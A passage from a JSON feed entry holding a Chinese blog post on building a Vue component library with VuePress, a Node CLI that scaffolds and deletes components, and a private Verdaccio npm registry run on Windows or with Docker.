id=\"添加编译脚本\" tabindex=\"-1\"> 添加编译脚本</h2>\n<div><p>注意</p>\n<p><code>core-js</code> 库需要采用的 2.6.5 这个版本, 高于这个版本的可能会导致开启文档失败</p>\n</div>\n<p><code>package.json</code> 其中的组件 name 推荐和创建的项目名一致</p>\n<div><pre><code><span>{</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"build:lib\"</span><span>:</span> <span>\"vue-cli-service build --target lib --name vtp-ui --dest lib packages/index.js\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>修改 main 主入口文件</p>\n<div><pre><code><span>{</span>\n  <span>\"main\"</span><span>:</span> <span>\"lib/vtp-ui.common.js\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"一个组件例子\" tabindex=\"-1\"> 一个组件例子</h2>\n<h3 id=\"vuepress-进阶配置\" tabindex=\"-1\"> vuepress 进阶配置</h3>\n<p><code>.vuepress/config.js</code></p>\n<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> baseDir <span>=</span> fs<span>.</span><span>readdirSync</span><span>(</span>path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>\"../base\"</span><span>)</span><span>)</span><span>;</span>\n<span>const</span> businessDir <span>=</span> fs<span>.</span><span>readdirSync</span><span>(</span>path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>\"../business\"</span><span>)</span><span>)</span><span>;</span>\n\n<span>const</span> config <span>=</span> <span>{</span>\n  <span>dest</span><span>:</span> <span>\"public\"</span><span>,</span>\n  <span>plugins</span><span>:</span> <span>[</span><span>\"vue-demo\"</span><span>,</span> <span>require</span><span>(</span><span>\"./plugins/clipboard-copy\"</span><span>)</span><span>]</span><span>,</span>\n  <span>serviceWorker</span><span>:</span> <span>true</span><span>,</span>\n  <span>themeConfig</span><span>:</span> <span>{</span>\n    <span>sidebar</span><span>:</span> <span>[</span>\n      <span>[</span><span>\"/Guide\"</span><span>,</span> <span>\"指南\"</span><span>]</span><span>,</span>\n      <span>{</span>\n        <span>title</span><span>:</span> <span>\"普通组件\"</span><span>,</span>\n        <span>collapsable</span><span>:</span> <span>false</span><span>,</span>\n        <span>children</span><span>:</span> <span>[</span>\n          <span>...</span>baseDir<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span><span>`</span><span>/base/</span><span><span>${</span>item<span>.</span><span>replace</span><span>(</span><span>\".md\"</span><span>,</span> <span>\"\"</span><span>)</span><span>}</span></span><span>`</span></span><span>)</span><span>,</span>\n        <span>]</span><span>,</span>\n      <span>}</span><span>,</span>\n      <span>{</span>\n        <span>title</span><span>:</span> <span>\"业务组件\"</span><span>,</span>\n        <span>collapsable</span><span>:</span> <span>false</span><span>,</span>\n        <span>children</span><span>:</span> <span>[</span>\n          <span>...</span>businessDir<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span><span>`</span><span>/business/</span><span><span>${</span>item<span>.</span><span>replace</span><span>(</span><span>\".md\"</span><span>,</span> <span>\"\"</span><span>)</span><span>}</span></span><span>`</span></span><span>)</span><span>,</span>\n        <span>]</span><span>,</span>\n      <span>}</span><span>,</span>\n    <span>]</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>markdown</span><span>:</span> <span>{</span>\n    <span>lineNumbers</span><span>:</span> <span>true</span><span>,</span>\n    <span>extendMarkdown</span><span>:</span> <span>(</span><span>md</span><span>)</span> <span>=></span> <span>{</span>\n      <span>// 使用 markdown-it-vuese 自动生成组件</span>\n      md<span>.</span><span>use</span><span>(</span><span>require</span><span>(</span><span>\"markdown-it-vuese\"</span><span>)</span><span>,</span> <span>{</span>\n        <span>vueseRe</span><span>:</span> <span><span>/</span><span>&lt;\\[vuese-h3\\]\\((.+)\\)</span><span>/</span><span>i</span></span><span>,</span>\n        <span>ruleName</span><span>:</span> <span>\"vuese-h3\"</span><span>,</span>\n        <span>useRender</span><span>:</span> <span>(</span><span>vueseRender</span><span>)</span> <span>=></span> <span>{</span>\n          <span>const</span> renderRes <span>=</span> vueseRender<span>.</span><span>render</span><span>(</span><span>)</span><span>;</span>\n          <span>const</span> <span>genMd</span> <span>=</span> <span>(</span><span>key</span><span>)</span> <span>=></span> <span><span>`</span><span>### </span><span><span>${</span>key<span>}</span></span><span>\\n</span><span><span>${</span>renderRes<span>[</span>key<span>]</span><span>}</span></span><span>\\n</span><span>`</span></span><span>;</span>\n          <span>return</span> Object<span>.</span><span>keys</span><span>(</span>renderRes<span>)</span><span>.</span><span>map</span><span>(</span>genMd<span>)</span><span>.</span><span>join</span><span>(</span><span>\"\"</span><span>)</span><span>;</span>\n        <span>}</span><span>,</span>\n      <span>}</span><span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>title</span><span>:</span> <span>\"vtp-ui\"</span><span>,</span>\n  <span>base</span><span>:</span> <span>\"/vtp-ui\"</span><span>,</span>\n  <span>chainWebpack</span><span>:</span> <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>,</span>\n<span>}</span><span>;</span>\n\nmodule<span>.</span>exports <span>=</span> config<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>重点</p>\n<p>在做组件库时, 有可能出现 <code>windows</code>、<code>document</code> 未能找到问题, 可以参考以下文章进行配置</p>\n<p><a href=\"https://segmentfault.com/a/1190000022727986\" target=\"_blank\" rel=\"noopener noreferrer\">VuePress window document is not defined</a></p>\n</div>\n<h3 id=\"cli-工具\" tabindex=\"-1\"> CLI 工具</h3>\n<div><p>提示</p>\n<p>这才是本弹的重点, 其他内容小主可自主查阅示例代码</p>\n</div>\n<p><code>vtp-cli/bin/vtp-cli.js</code></p>\n<div><pre><code><span>#! /usr/bin/env node</span>\n\n<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs\"</span><span>)</span><span>;</span>\n<span>const</span> <span>{</span> version <span>}</span> <span>=</span> <span>require</span><span>(</span><span>\"../package.json\"</span><span>)</span><span>;</span>\n<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>\"chalk\"</span><span>)</span><span>;</span>\n<span>const</span> program <span>=</span> <span>require</span><span>(</span><span>\"commander\"</span><span>)</span><span>;</span>\n<span>const</span> initPackage <span>=</span> <span>require</span><span>(</span><span>\"./vtp-new\"</span><span>)</span><span>;</span>\n<span>const</span> delPackage <span>=</span> <span>require</span><span>(</span><span>\"./vtp-del\"</span><span>)</span><span>;</span>\n\n<span>const</span> <span>VUPRESS_DIR</span> <span>=</span> <span>\"docs/.vuepress\"</span><span>;</span>\n\n<span>const</span> isProject <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span><span>VUPRESS_DIR</span><span>)</span><span>;</span>\n\n<span>if</span> <span>(</span>isProject<span>)</span> <span>{</span>\n  program\n    <span>.</span><span>version</span><span>(</span>version<span>)</span>\n    <span>.</span><span>usage</span><span>(</span><span>\"[options]\"</span><span>)</span>\n    <span>.</span><span>description</span><span>(</span><span>\"运行命令来为你的组件库新增或者删除组件。\"</span><span>)</span><span>;</span>\n\n  program<span>.</span><span>command</span><span>(</span><span>\"new\"</span><span>)</span><span>.</span><span>description</span><span>(</span><span>\"创建一个组件\"</span><span>)</span><span>.</span><span>action</span><span>(</span>initPackage<span>)</span><span>;</span>\n\n  program<span>.</span><span>command</span><span>(</span><span>\"del\"</span><span>)</span><span>.</span><span>description</span><span>(</span><span>\"删除一个组件\"</span><span>)</span><span>.</span><span>action</span><span>(</span>delPackage<span>)</span><span>;</span>\n  program<span>.</span><span>parse</span><span>(</span>process<span>.</span>argv<span>)</span><span>;</span>\n<span>}</span> <span>else</span> <span>{</span>\n  console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span>\"非常抱歉！当前的项目目录非组件库目录。\"</span><span>)</span><span>)</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>vtp-cli/bin/vtp-new.js</code></p>\n<div><pre><code><span>#! /usr/bin/env node</span>\n\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> uppercamelcase <span>=</span> <span>require</span><span>(</span><span>\"uppercamelcase\"</span><span>)</span><span>;</span>\n\n<span>const</span> mkdirs <span>=</span> <span>require</span><span>(</span><span>\"./utils/mkdirs\"</span><span>)</span><span>;</span>\n<span>const</span> copyFile <span>=</span> <span>require</span><span>(</span><span>\"./utils/file\"</span><span>)</span><span>;</span>\n<span>const</span> newHandleInquirer <span>=</span> <span>require</span><span>(</span><span>\"./inquirer/new-inquier\"</span><span>)</span><span>;</span>\n\n<span>const</span> <span>PACKAGES_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span>process<span>.</span><span>cwd</span><span>(</span><span>)</span><span>}</span></span><span>/packages</span><span>`</span></span><span>;</span>\n<span>const</span> <span>CSS_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/theme-chalk</span><span>`</span></span><span>;</span>\n<span>const</span> <span>DOCS_DIR</span> <span>=</span> <span>\"docs\"</span><span>;</span>\n\n<span>const</span> <span>initPackage</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n  <span>newHandleInquirer</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>choices</span><span>)</span> <span>=></span> <span>{</span>\n    <span>const</span> <span>{</span> compoenntName<span>,</span> compoenntType <span>}</span> <span>=</span> choices<span>;</span>\n    <span>const</span> <span>PACKAGE_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/</span><span><span>${</span>compoenntName<span>}</span></span><span>`</span></span><span>;</span>\n    <span>const</span> <span>PACKAGE_DOCS_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span><span>DOCS_DIR</span><span>}</span></span><span>/</span><span><span>${</span>compoenntType<span>}</span></span><span>`</span></span><span>;</span>\n    <span>mkdirs</span><span>(</span><span>PACKAGE_DIR</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n      <span>copyFile</span><span>(</span>\n        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"/tmp\"</span><span>)</span><span>,</span>\n        <span>PACKAGE_DIR</span><span>,</span>\n        <span>\"entry.js.tmp\"</span><span>,</span>\n        <span>\"index.js\"</span><span>,</span>\n        choices\n      <span>)</span><span>;</span>\n      <span>copyFile</span><span>(</span>\n        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"/tmp\"</span><span>)</span><span>,</span>\n        <span>PACKAGE_DIR</span><span>,</span>\n        <span>\"entry.vue.tmp\"</span><span>,</span>\n        <span><span>`</span><span><span>${</span><span>uppercamelcase</span><span>(</span>compoenntName<span>)</span><span>}</span></span><span>.vue</span><span>`</span></span><span>,</span>\n        choices\n      <span>)</span><span>;</span>\n      <span>copyFile</span><span>(</span>\n        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"/tmp\"</span><span>)</span><span>,</span>\n        <span>PACKAGE_DOCS_DIR</span><span>,</span>\n        <span>\"entry.md.tmp\"</span><span>,</span>\n        <span><span>`</span><span><span>${</span><span>uppercamelcase</span><span>(</span>compoenntName<span>)</span><span>}</span></span><span>.md</span><span>`</span></span><span>,</span>\n        choices\n      <span>)</span><span>;</span>\n      <span>copyFile</span><span>(</span>\n        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"/tmp\"</span><span>)</span><span>,</span>\n        <span>CSS_DIR</span><span>,</span>\n        <span>\"entry.scss.tmp\"</span><span>,</span>\n        <span><span>`</span><span><span>${</span>compoenntName<span>}</span></span><span>.scss</span><span>`</span></span><span>,</span>\n        choices\n      <span>)</span><span>;</span>\n      <span>copyFile</span><span>(</span>\n        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"/tmp\"</span><span>)</span><span>,</span>\n        <span>CSS_DIR</span><span>,</span>\n        <span>\"entry.css.tmp\"</span><span>,</span>\n        <span><span>`</span><span><span>${</span>compoenntName<span>}</span></span><span>.css</span><span>`</span></span><span>,</span>\n        choices\n      <span>)</span><span>;</span>\n      <span>// copyFile(path.join(__dirname, '/tmp'), CSS_DIR, 'entry.min.css.tmp', `${compoenntName}.min.css` , choices)</span>\n      <span>copyFile</span><span>(</span>\n        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"/tmp\"</span><span>)</span><span>,</span>\n        <span>PACKAGES_DIR</span><span>,</span>\n        <span>\"export.js.tmp\"</span><span>,</span>\n        <span>\"index.js\"</span><span>,</span>\n        choices\n      <span>)</span><span>;</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n\nmodule<span>.</span>exports <span>=</span> initPackage<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>vtp-cli/bin/vtp-del.js</code></p>\n<div><pre><code><span>#! /usr/bin/env node</span>\n\n<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>\"chalk\"</span><span>)</span><span>;</span>\n<span>const</span> uppercamelcase <span>=</span> <span>require</span><span>(</span><span>\"uppercamelcase\"</span><span>)</span><span>;</span>\n\n<span>const</span> delHandleInquirer <span>=</span> <span>require</span><span>(</span><span>\"./inquirer/del-inquirer.js\"</span><span>)</span><span>;</span>\n<span>const</span> copyFile <span>=</span> <span>require</span><span>(</span><span>\"./utils/file\"</span><span>)</span><span>;</span>\n\n<span>const</span> <span>PACKAGES_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span>process<span>.</span><span>cwd</span><span>(</span><span>)</span><span>}</span></span><span>/packages</span><span>`</span></span><span>;</span>\n<span>const</span> <span>DOCS_DIR</span> <span>=</span> <span>\"docs\"</span><span>;</span>\n<span>const</span> <span>CSS_DIRECTORY</span> <span>=</span> <span><span>`</span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/theme-chalk</span><span>`</span></span><span>;</span>\n<span>const</span> <span>removePromise</span> <span>=</span> <span>(</span><span>dir</span><span>)</span> <span>=></span> <span>{</span>\n  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>{</span>\n    <span>// 先读文件夹</span>\n    fs<span>.</span><span>stat</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> stat</span><span>)</span> <span>{</span>\n      <span>if</span> <span>(</span>stat<span>.</span><span>isDirectory</span><span>(</span><span>)</span><span>)</span> <span>{</span>\n        fs<span>.</span><span>readdir</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> files</span><span>)</span> <span>{</span>\n          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> path<span>.</span><span>join</span><span>(</span>dir<span>,</span> file<span>)</span><span>)</span><span>;</span> <span>// a/b  a/m</span>\n          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> <span>removePromise</span><span>(</span>file<span>)</span><span>)</span><span>;</span> <span>// 这时候变成了promise</span>\n          Promise<span>.</span><span>all</span><span>(</span>files<span>)</span><span>.</span><span>then</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>\n            fs<span>.</span><span>rmdir</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>\n          <span>}</span><span>)</span><span>;</span>\n        <span>}</span><span>)</span><span>;</span>\n      <span>}</span> <span>else</span> <span>{</span>\n        fs<span>.</span><span>unlink</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>\n      <span>}</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n\n<span>const</span> <span>delPackage</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n  <span>delHandleInquirer</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>choices</span><span>)</span> <span>=></span> <span>{</span>\n    <span>const</span> <span>{</span> delPackageName<span>,</span> isDel <span>}</span> <span>=</span> choices<span>;</span>\n\n    <span>if</span> <span>(</span>isDel<span>)</span> <span>{</span>\n      <span>const</span> <span>PACKAGE_DIR</span> <span>=</span> <span><span>`</span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/</span><span><span>${</span>delPackageName<span>}</span></span><span>`</span></span><span>;</span>\n      <span>const</span> <span>SCSS_NAME</span> <span>=</span> <span><span>`</span><span><span>${</span><span>CSS_DIRECTORY</span><span>}</span></span><span>/</span><span><span>${</span>delPackageName<span>}</span></span><span>.scss</span><span>`</span></span><span>;</span>\n      <span>const</span> <span>CSS_NAME</span> <span>=</span> <span><span>`</span><span><span>${</span><span>CSS_DIRECTORY</span><span>}</span></span><span>/</span><span><span>${</span>delPackageName<span>}</span></span><span>.css</span><span>`</span></span><span>;</span>\n      <span>// const CSS_MIN_NAME = `${CSS_DIRECTORY}/${delPackageName}.min.css`</span>\n      <span>const</span> <span>BASE_DOCS</span> <span>=</span> <span><span>`</span><span><span>${</span><span>DOCS_DIR</span><span>}</span></span><span>/base/</span><span><span>${</span><span>uppercamelcase</span><span>(</span>delPackageName<span>)</span><span>}</span></span><span>.md</span><span>`</span></span><span>;</span>\n      <span>const</span> <span>BUSINESS_DOCS</span> <span>=</span> <span><span>`</span><span><span>${</span><span>DOCS_DIR</span><span>}</span></span><span>/business/</span><span><span>${</span><span>uppercamelcase</span><span>(</span>\n        delPackageName\n      <span>)</span><span>}</span></span><span>.md</span><span>`</span></span><span>;</span>\n      <span>removePromise</span><span>(</span><span>PACKAGE_DIR</span><span>)</span><span>;</span>\n      console<span>.</span><span>log</span><span>(</span>\n        chalk<span>.</span><span>green</span><span>(</span>\n          <span><span>`</span><span>The package directory </span><span><span>${</span><span>PACKAGES_DIR</span><span>}</span></span><span>/</span><span><span>${</span>delPackageName<span>}</span></span><span> was deleted successfully.</span><span>`</span></span>\n        <span>)</span>\n      <span>)</span><span>;</span>\n\n      <span>const</span> delFiles <span>=</span> <span>[</span>\n        <span>SCSS_NAME</span><span>,</span>\n        <span>CSS_NAME</span><span>,</span>\n        <span>// CSS_MIN_NAME,</span>\n        <span>BASE_DOCS</span><span>,</span>\n        <span>BUSINESS_DOCS</span><span>,</span>\n      <span>]</span><span>;</span>\n      delFiles<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>\n        fs<span>.</span><span>unlink</span><span>(</span>item<span>,</span> <span>(</span><span>err</span><span>)</span> <span>=></span> <span>{</span>\n          <span>if</span> <span>(</span><span>!</span>err<span>)</span> <span>{</span>\n            console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span>Delete file </span><span><span>${</span>item<span>}</span></span><span> successfully.</span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n          <span>}</span>\n        <span>}</span><span>)</span><span>;</span>\n      <span>}</span><span>)</span><span>;</span>\n      <span>copyFile</span><span>(</span>\n        path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"/tmp\"</span><span>)</span><span>,</span>\n        <span>PACKAGES_DIR</span><span>,</span>\n        <span>\"export.js.tmp\"</span><span>,</span>\n        <span>\"index.js\"</span><span>,</span>\n        choices\n      <span>)</span><span>;</span>\n    <span>}</span> <span>else</span> <span>{</span>\n      console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>gray</span><span>(</span><span>\"已经为你取消当前的删除操作.\"</span><span>)</span><span>)</span><span>;</span>\n    <span>}</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n\nmodule<span>.</span>exports <span>=</span> delPackage<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"开启私有代理\" tabindex=\"-1\"> 开启私有代理</h2>\n<h3 id=\"windows-服务器\" tabindex=\"-1\"> Windows 服务器</h3>\n<ul>\n<li><code>BAT_SCRIPT</code> 启动代理或者终止代理的脚本</li>\n</ul>\n<p><code>forever-npm-start.bat</code></p>\n<div><pre><code>@echo off\nC:\ncd C:\\Users\\Administrator\\AppData\\Roaming\\npm\\node_modules\\verdaccio\\build\\lib\nforever start cli.js\nexit\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p><code>forever-npm-stop.bat</code></p>\n<div><pre><code>@echo off\nC:\ncd C:\\Users\\Administrator\\AppData\\Roaming\\npm\\node_modules\\verdaccio\\build\\lib\nforever stop cli.js\nexit\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><ul>\n<li>安装相关的依赖</li>\n</ul>\n<div><pre><code><span>npm</span>  <span>install</span>  -g  forever  verdaccio\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ul>\n<li>修改监听的端口号, 必须修改否则外网将访问不到（参考文件目录 C:\\Users\\Administrator\\AppData\\Roaming\\verdaccio\\config.yml）, 添加一行配置 <code>listen: 0.0.0.0:4873</code></li>\n<li>拷贝项目中的 BAT_SCRIPT 文件夹到 windows 服务器上的任何一个地方</li>\n</ul>\n<div><p>注意</p>\n<ul>\n<li>双击运行文件夹中的 forever-npm-start.bat 即可开启 npm 代理服务</li>\n<li>双击运行文件夹中的 forever-npm-stop.bat 即可关闭 npm 代理服务</li>\n<li>需要终止服务的话, 必须运行 forever-npm-stop.bat 否则在不重启机子下永远也关不掉该服务</li>\n</ul>\n</div>\n<h3 id=\"有-docker-环境的服务器\" tabindex=\"-1\"> 有 Docker 环境的服务器</h3>\n<p><code>DOCKER</code> 中的 <code>docker-compose.yml</code></p>\n<div><pre><code><span>version</span><span>:</span> <span>\"3\"</span>\n\n<span>services</span><span>:</span>\n  <span>verdaccio</span><span>:</span>\n    <span>image</span><span>:</span> verdaccio/verdaccio\n    <span>restart</span><span>:</span> always\n    <span>container_name</span><span>:</span> verdaccio\n    <span>ports</span><span>:</span>\n      <span>-</span> <span>\"4873:4873\"</span>\n\n    <span>volumes</span><span>:</span>\n      <span>-</span> ./verdaccio<span>-</span>storage<span>:</span>/verdaccio/storage\n\n<span>volumes</span><span>:</span>\n  <span>verdaccio</span><span>:</span>\n    <span>driver</span><span>:</span> local\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>\n<li>拷贝项目中的 DOCKER 文件夹到有 Docker 环境的服务器的任何一个地方</li>\n<li>切换至 DOCKER 目录</li>\n<li>使用 docker-compose 开启服务</li>\n</ul>\n<div><pre><code><span>docker-compose</span>  up  -d\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ul>\n<li>使用 docker-compose 开启服务</li>\n</ul>\n<div><pre><code><span>docker-compose</span>  stop\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "date_published": "2020-06-26T10:57:54.000Z",
      "date_modified": "2022-08-01T13:55:22.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "vuejs"
      ]
    }
  ]
}